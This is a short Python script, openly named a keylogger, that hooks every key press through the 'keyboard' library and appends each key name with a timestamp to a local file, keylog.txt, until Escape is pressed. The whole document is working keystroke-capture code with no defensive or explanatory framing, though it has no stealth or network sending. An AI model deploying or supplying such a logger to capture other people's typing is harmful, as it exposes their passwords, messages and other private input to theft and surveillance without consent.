import keyboard
import time
from datetime import datetime

LOG_FILE = "keylog.txt"

def on_key_press(event):
    with open(LOG_FILE, "a") as f:
        f.write(f"{datetime.now()} - {event.name}\n")

def start_keylogger():
    print("Keylogger started. Press 'esc' to stop.")
    keyboard.on_press(on_key_press)
    keyboard.wait('esc')  # Stop keylogger when 'esc' is pressed

if __name__ == "__main__":
    start_keylogger()
